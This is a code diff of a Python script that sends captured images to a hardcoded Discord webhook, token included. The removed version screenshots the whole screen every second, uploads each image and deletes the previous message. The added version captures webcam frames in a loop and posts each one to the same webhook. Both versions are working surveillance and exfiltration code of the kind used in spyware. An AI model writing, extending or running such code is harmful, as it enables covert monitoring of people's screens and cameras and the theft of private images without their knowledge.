@@ -1,69 +1,54 @@
-import os
+import cv2
 import time
 import requests
-from PIL import ImageGrab
 
-# Discord Webhook URL
-DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1330674445865586728/W2BI-bA25yoVHs0XTclaneW7mXtp-Dhhw_eB8sHQDtw8fCzvVm88riYSkJ14etboAaBE"
+# Discord webhook URL
+WEBHOOK_URL = "https://discord.com/api/webhooks/1330674445865586728/W2BI-bA25yoVHs0XTclaneW7mXtp-Dhhw_eB8sHQDtw8fCzvVm88riYSkJ14etboAaBE"
 
-# Path for storing the screenshot
-screenshot_path = "screenshot.png"
+def stream_video_to_webhook(webhook_url, video_source=0, frame_interval=1):
+    """
+    Streams video to a Discord webhook by sending frames as image files.
 
-# Global variable to store the message ID of the last screenshot
-last_message_id = None
+    :param webhook_url: The Discord webhook URL
+    :param video_source: Video source for OpenCV (default is 0 for webcam)
+    :param frame_interval: Time in seconds between sending each frame
+    """
+    # Open a connection to the video source
+    cap = cv2.VideoCapture(video_source)
+    if not cap.isOpened():
+        print("Error: Unable to access the video source.")
+        return
 
-def capture_screenshot(save_path):
-    """Capture a screenshot and save it to the specified path."""
-    screenshot = ImageGrab.grab()
-    screenshot.save(save_path, "PNG")
-    print(f"Screenshot saved at {save_path}.")
+    try:
+        print("Streaming video. Press Ctrl+C to stop.")
+        while True:
+            # Capture a frame
+            ret, frame = cap.read()
+            if not ret:
+                print("Error: Unable to capture frame.")
+                break
 
-def send_to_discord(file_path, webhook_url):
-    """Send the screenshot file to Discord using a webhook."""
-    global last_message_id
+            # Encode the frame as a JPEG image
+            _, buffer = cv2.imencode(".jpg", frame)
 
-    # Delete the previous message if it exists
-    if last_message_id:
-        delete_discord_message(webhook_url, last_message_id)
+            # Prepare the image file to send
+            files = {
+                "file": ("frame.jpg", buffer.tobytes(), "image/jpeg")
+            }
 
-    # Send the new screenshot
-    with open(file_path, "rb") as file:
-        payload = {
-            "content": "Here is the latest screenshot."
-        }
-        files = {
-            "file": file
-        }
-        response = requests.post(webhook_url, data=payload, files=files)
+            # Send the frame to the webhook
+            response = requests.post(webhook_url, files=files)
+            if response.status_code != 204:
+                print(f"Error: Failed to send frame. Status code: {response.status_code}, Response: {response.text}")
+            
+            # Wait before sending the next frame to simulate a stream
+            time.sleep(frame_interval)
+    except KeyboardInterrupt:
+        print("\nStreaming stopped.")
+    finally:
+        # Release the video capture
+        cap.release()
 
-    if response.status_code == 200 or response.status_code == 204:
-        # Save the message ID for the new screenshot
-        last_message_id = response.json()["id"]
-        print("Screenshot sent to Discord successfully.")
-    else:
-        print(f"Failed to send screenshot to Discord: {response.status_code} - {response.text}")
-
-def delete_discord_message(webhook_url, message_id):
-    """Delete a message on Discord using its ID."""
-    delete_url = f"{webhook_url}/messages/{message_id}"
-    response = requests.delete(delete_url)
-
-    if response.status_code == 204:
-        print(f"Deleted previous screenshot message: {message_id}")
-    else:
-        print(f"Failed to delete previous message: {response.status_code} - {response.text}")
-
-def main():
-    while True:
-        # Capture a new screenshot
-        capture_screenshot(screenshot_path)
-        
-        # Send the screenshot to Discord
-        send_to_discord(screenshot_path, DISCORD_WEBHOOK_URL)
-        
-        # Wait before capturing the next screenshot
-        print("Waiting for 60 seconds before taking the next screenshot...")
-        time.sleep(1)
-
+# Run the video streaming function
 if __name__ == "__main__":
-    main()
+    stream_video_to_webhook(WEBHOOK_URL, video_source=0, frame_interval=1)
